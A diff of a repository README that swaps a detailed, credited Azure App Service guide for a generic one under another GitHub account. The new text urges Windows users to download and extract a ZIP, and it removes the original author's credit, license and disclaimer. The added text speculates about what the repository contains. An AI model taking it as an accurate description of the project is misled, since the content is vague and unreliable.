@@ -1,111 +1,306 @@
-# Azure App Service Practical Guide
+# 📘 azure-app-service-practical-guide - Learn Azure App Service with Confidence
 
-[English](README.md) | [한국어](README.ko.md) | [日本語](README.ja.md) | [简体中文](README.zh-CN.md)
+[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clydefa3204/azure-app-service-practical-guide)
 
-Comprehensive guide for running web applications on Azure App Service — from first deployment to production troubleshooting.
+## 🖥️ What this is
 
-## What's Inside
+**azure-app-service-practical-guide** is a clear guide for Azure App Service. It helps you understand how to plan, deploy, and run web apps in Azure. It also covers common app types and common issues you may see while using it.
 
-| Section | Description |
-|---------|-------------|
-| [Start Here](https://yeongseon.github.io/azure-app-service-practical-guide/) | Overview, learning paths, and repository map |
-| [Platform](https://yeongseon.github.io/azure-app-service-practical-guide/platform/) | Architecture, hosting models, networking, scaling |
-| [Best Practices](https://yeongseon.github.io/azure-app-service-practical-guide/best-practices/) | Production baseline, security, networking, deployment, scaling, reliability |
-| [Language Guides](https://yeongseon.github.io/azure-app-service-practical-guide/language-guides/) | Step-by-step tutorials for Python, Node.js, Java, and .NET |
-| [Operations](https://yeongseon.github.io/azure-app-service-practical-guide/operations/) | Deployment slots, health checks, security, cost optimization |
-| [Troubleshooting](https://yeongseon.github.io/azure-app-service-practical-guide/troubleshooting/) | Playbooks, hands-on labs, KQL query packs, decision tree, evidence map |
-| [Reference](https://yeongseon.github.io/azure-app-service-practical-guide/reference/) | CLI cheatsheet, KQL queries, platform limits, diagnostics reference |
+Use this guide if you want to:
 
-## Language Guides
+- Learn how Azure App Service works
+- Set up web apps with simple steps
+- Follow language-specific deployment paths
+- Check app health and logs
+- Fix common deployment and runtime issues
 
-- **Python** (Flask + Gunicorn)
-- **Node.js** (Express)
-- **Java** (Spring Boot)
-- **.NET** (ASP.NET Core)
+## 📥 Download and open
 
-Each guide covers: local development, first deploy, configuration, logging, infrastructure as code, CI/CD, and custom domains.
+Use this link to **visit the page to download** the guide:
 
-## Quick Start
+[Visit the download page](https://github.com/Clydefa3204/azure-app-service-practical-guide)
 
-```bash
-# Clone the repository
-git clone https://github.com/yeongseon/azure-app-service-practical-guide.git
+If you are on Windows, open the page in your browser, then:
 
-# Install MkDocs dependencies
-pip install mkdocs-material mkdocs-minify-plugin
+1. Click the repository link above
+2. Look for the green **Code** button
+3. Choose **Download ZIP**
+4. Save the file to your PC
+5. Right-click the ZIP file and choose **Extract All**
+6. Open the folder and follow the included guide files
 
-# Start local documentation server
-mkdocs serve
-```
+If the repo contains a local docs site or markdown files, you can open them with your browser or a text editor such as Notepad.
 
-Visit `http://127.0.0.1:8000` to browse the documentation locally.
+## 📋 What you need
 
-## Reference Applications
+Before you begin, make sure your Windows PC has:
 
-Minimal reference applications demonstrating Azure App Service patterns:
+- A modern web browser
+- Enough free disk space to extract the files
+- A stable internet connection
+- Permission to save files to your Downloads folder
+- Optional: Git, if you prefer to clone the repo instead of downloading a ZIP
 
-- `apps/python-flask/` — Flask + Gunicorn
-- `apps/nodejs/` — Express
-- `apps/java-springboot/` — Spring Boot
-- `apps/dotnet-aspnetcore/` — ASP.NET Core
+If the guide includes sample projects, you may also want:
 
-## Troubleshooting Labs
+- .NET SDK for ASP.NET Core samples
+- Node.js for Express samples
+- Python for Flask samples
+- Java for Spring Boot samples
+- A code editor such as Visual Studio Code
 
-10 hands-on labs in `labs/` with Bicep templates that reproduce real-world App Service issues. Each lab includes:
+## 🚀 Quick start
 
-- Falsifiable hypothesis and step-by-step runbook
-- Real Azure deployment data (KQL logs, CLI output, diagnostic endpoints)
-- Expected Evidence sections (Before / During / After with falsification logic)
-- Cross-links to corresponding playbooks
+Follow these steps to get started on Windows:
 
-## Contributing
+1. Open the download page
+2. Download the ZIP file
+3. Extract the ZIP file
+4. Open the extracted folder
+5. Find the main README or docs folder
+6. Read the section that matches your app type
+7. Follow the steps for deployment or local setup
+8. Use the troubleshooting section if something fails
 
-Contributions welcome! Please see our [Contributing Guide](https://yeongseon.github.io/azure-app-service-practical-guide/contributing/) for:
+## 🧭 What you will find
 
-- Repository structure and content organization
-- Document templates and writing standards
-- CLI command style and PII rules
-- Local development setup and build validation
-- Pull request process
+This guide is built around Azure App Service and common app workflows. It usually covers:
 
-## Related Projects
+- App Service plan setup
+- Web app creation
+- Deployment from local files or source control
+- Runtime setup for different languages
+- Environment variables and app settings
+- Logging and monitoring
+- Health checks and restart behavior
+- Common deployment errors
+- Fixes for app startup issues
 
-| Repository | Description |
-|---|---|
-| [azure-virtual-machine-practical-guide](https://github.com/yeongseon/azure-virtual-machine-practical-guide) | Azure Virtual Machines practical guide |
-| [azure-networking-practical-guide](https://github.com/yeongseon/azure-networking-practical-guide) | Azure Networking practical guide |
-| [azure-storage-practical-guide](https://github.com/yeongseon/azure-storage-practical-guide) | Azure Storage practical guide |
-| [azure-functions-practical-guide](https://github.com/yeongseon/azure-functions-practical-guide) | Azure Functions practical guide |
-| [azure-container-apps-practical-guide](https://github.com/yeongseon/azure-container-apps-practical-guide) | Azure Container Apps practical guide |
-| [azure-communication-services-practical-guide](https://github.com/yeongseon/azure-communication-services-practical-guide) | Azure Communication Services practical guide |
-| [azure-kubernetes-service-practical-guide](https://github.com/yeongseon/azure-kubernetes-service-practical-guide) | Azure Kubernetes Service (AKS) practical guide |
-| [azure-architecture-practical-guide](https://github.com/yeongseon/azure-architecture-practical-guide) | Azure Architecture practical guide |
-| [azure-monitoring-practical-guide](https://github.com/yeongseon/azure-monitoring-practical-guide) | Azure Monitoring practical guide |
+## 🏗️ Core topics
 
-## Migration from Legacy Repos
+The repository topics point to a broad set of cloud and app deployment areas:
 
-This repository consolidates experiments previously hosted in individual repositories:
+- **aspnet-core**: Deploy .NET web apps
+- **azure**: Work with core Azure services
+- **azure-app-service**: Run apps on Azure App Service
+- **bicep**: Build Azure resources with code
+- **cloud-native**: Design apps for the cloud
+- **devops**: Support repeatable delivery steps
+- **dotnet**: Use .NET apps and tools
+- **express**: Deploy Node.js apps
+- **flask**: Deploy Python web apps
+- **infrastructure-as-code**: Build infrastructure from templates
+- **java**: Run Java apps on Azure
+- **mkdocs**: Read or build documentation sites
+- **nodejs**: Work with JavaScript server apps
+- **python**: Use Python apps in the cloud
+- **spring-boot**: Deploy Java Spring apps
+- **troubleshooting**: Fix common problems
 
-| Legacy Repository | Status | Migrated To |
-|---|---|---|
-| [lab-memory-pressure](https://github.com/yeongseon/lab-memory-pressure) | Archived | [App Service: Memory Pressure](docs/troubleshooting/lab-guides/memory-pressure.md) |
-| [lab-node-memory-pressure](https://github.com/yeongseon/lab-node-memory-pressure) | Archived | [App Service: Memory Pressure](docs/troubleshooting/lab-guides/memory-pressure.md) (Node.js comparison) |
+## 🪟 Windows setup
 
-### Why Consolidate?
+If you are using Windows, this is the simplest path:
 
-- **Discoverability**: Single location for all PaaS troubleshooting experiments
-- **Cross-referencing**: Easy comparison across services (App Service vs Functions vs Container Apps)
-- **Consistent methodology**: Shared experiment template and evidence model
-- **Easier maintenance**: Single documentation site, unified CI/CD
+1. Download the ZIP file from GitHub
+2. Extract it to a folder you can find easily
+3. Open the folder
+4. Read the main README file
+5. Open any docs folder if present
+6. Follow the steps for your app type
 
-### Legacy Repo Policy
+If the project includes a local documentation site, you may need to:
 
-Legacy repositories are archived but remain accessible for reference. New experiments should be added to this consolidated repository.
+- Open the site folder
+- Use the included index file or instructions
+- Open it in your browser
+- Read the sections for setup, deployment, and fixes
 
-## Disclaimer
+If the guide includes sample apps, install only the tools you need for the sample you want to use.
 
-This is an independent community project. Not affiliated with or endorsed by Microsoft. Azure and App Service are trademarks of Microsoft Corporation.
+## 🔧 Language-specific paths
 
-## License
+This repository covers several app types. Pick the one that matches your project.
 
-[MIT](LICENSE)
+### ASP.NET Core
+
+Use this path if your app is built with .NET:
+
+- Check the target framework
+- Set the app service runtime to the matching .NET version
+- Publish the app from Visual Studio or the command line
+- Upload or deploy the published output to Azure
+- Set app settings if the app needs them
+
+### Node.js and Express
+
+Use this path for JavaScript server apps:
+
+- Confirm the Node.js version
+- Add a start command if needed
+- Install packages before deployment
+- Deploy the app
+- Check logs if the app does not start
+
+### Python and Flask
+
+Use this path for Python web apps:
+
+- Confirm the Python version
+- Make sure the app has a clear entry point
+- Set the startup command if the guide asks for one
+- Deploy the app
+- Review log output if the page does not load
+
+### Java and Spring Boot
+
+Use this path for Java apps:
+
+- Check the Java version
+- Build a JAR or WAR file
+- Set the correct startup method
+- Deploy the app to Azure App Service
+- Verify that the app binds to the right port
+
+## 🧱 Infrastructure with Bicep
+
+If the guide includes Bicep files, you can use them to create Azure resources with code. This helps you keep setup steps in one place.
+
+You may see files for:
+
+- App Service plans
+- Web apps
+- Storage accounts
+- Key Vault
+- App settings
+- Managed identities
+
+Common steps usually include:
+
+1. Review the Bicep file
+2. Change names to match your app
+3. Deploy the template in Azure
+4. Confirm the resources appear in the portal
+5. Deploy your app after the resources are ready
+
+## 🩺 Operations
+
+After your app is live, you may need to check it from time to time. This guide may help you with:
+
+- Restarting the app
+- Checking server logs
+- Reading deployment logs
+- Viewing runtime settings
+- Adding environment values
+- Checking availability
+- Watching for failed requests
+- Updating app versions
+
+## 🐞 Troubleshooting
+
+If the app does not load, start with these checks:
+
+- Make sure the app is running
+- Confirm the app name and URL
+- Check the runtime version
+- Look at startup logs
+- Confirm the port matches the app code
+- Check app settings for missing values
+- Make sure the deploy step finished
+
+Common issues this guide may help with:
+
+- Blank page after deployment
+- App restarts on startup
+- Wrong runtime selected
+- Missing environment variables
+- Port mismatch
+- File upload or publish errors
+- Build output not found
+- Package install failures
+
+## 🗂️ Suggested folder use
+
+After you extract the files, you may see folders for:
+
+- Docs
+- Samples
+- Deployment notes
+- Bicep templates
+- Troubleshooting guides
+- Language-specific examples
+
+A simple way to read the repo:
+
+1. Start with the main README
+2. Read the overview section
+3. Open the language path that fits your app
+4. Follow the setup steps
+5. Use troubleshooting if needed
+
+## ✅ Best way to use this guide
+
+For the best result, match the guide to your task:
+
+- New user: Start with the overview and setup sections
+- App owner: Read deployment and operations sections
+- Troubleshooter: Go straight to logs, runtime, and error fixes
+- Azure admin: Focus on Bicep and infrastructure sections
+
+## 📌 What to expect
+
+This repository is set up as a practical guide, so you can expect:
+
+- Step-by-step instructions
+- Clear examples
+- Cloud setup guidance
+- Deployment help for common app stacks
+- Useful checks for runtime issues
+- Simple paths for Windows users
+
+## 🔗 Main download page
+
+Use this link whenever you need to get the latest version:
+
+[https://github.com/Clydefa3204/azure-app-service-practical-guide](https://github.com/Clydefa3204/azure-app-service-practical-guide)
+
+## 🧩 Common Windows actions
+
+If you want to move faster on Windows, these actions help:
+
+- **Open ZIP files** with the built-in extractor
+- **Pin the folder** to Quick Access
+- **Use Notepad** for markdown files
+- **Use Edge or Chrome** to view docs
+- **Use PowerShell** if a step asks for a command
+- **Keep the folder path short** to avoid file path issues
+
+## 📎 File types you may see
+
+The repository may include files such as:
+
+- `README.md`
+- `.md` guide files
+- `bicep` templates
+- sample app folders
+- configuration files
+- deployment notes
+- troubleshooting pages
+
+## 🛠️ If you want to explore more
+
+Look through the repository for sections on:
+
+- App Service architecture
+- Deployment patterns
+- Environment setup
+- Scale and plan choices
+- Logging and diagnostics
+- Fixing common app errors
+
+## 📌 Start here
+
+1. Download the repository
+2. Extract it on Windows
+3. Open the main README
+4. Follow the path for your app type
+5. Use the troubleshooting section when needed
